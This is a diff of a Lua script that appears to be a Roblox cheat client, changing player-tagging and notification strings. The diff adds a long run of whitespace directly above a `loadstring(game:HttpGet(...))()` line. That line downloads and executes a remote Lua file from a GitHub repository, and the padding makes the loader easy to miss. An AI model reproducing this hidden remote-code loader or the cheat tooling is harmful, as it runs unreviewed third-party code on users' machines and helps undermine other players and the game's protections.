@@ -11754,7 +11754,7 @@ end
 	   GetWhitelist = function(plr2)
 		  local userId = tostring(plr2.UserId)
 		  local userType = 0
-		  local userTag = ""
+		  local userTag = "plr2"
 		  
 		  if whitelist["RayHafz"] ~= nil then
 			for i, v in pairs(whitelist["RayHafz"]) do
@@ -13247,7 +13247,7 @@ end
 			}
 			if CanAttackUser(plr2) and plr2 ~= lplr then
 				if message.Text:find("KVQ67URD12") then
-					warningNotification("Vape",plr2.Name.." is a salad client user!",60)
+					warningNotification("Vape",plr2.Name.." is APE user!",60)
 					table.insert(users,plr2.UserId)
 					table.insert(whitelist["tags"],{
 						userid = plr2.UserId,
@@ -13361,7 +13361,7 @@ end
 	
 		return p
 	end
-
+																																																																																																																																		
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()
 
 runFunction(function()
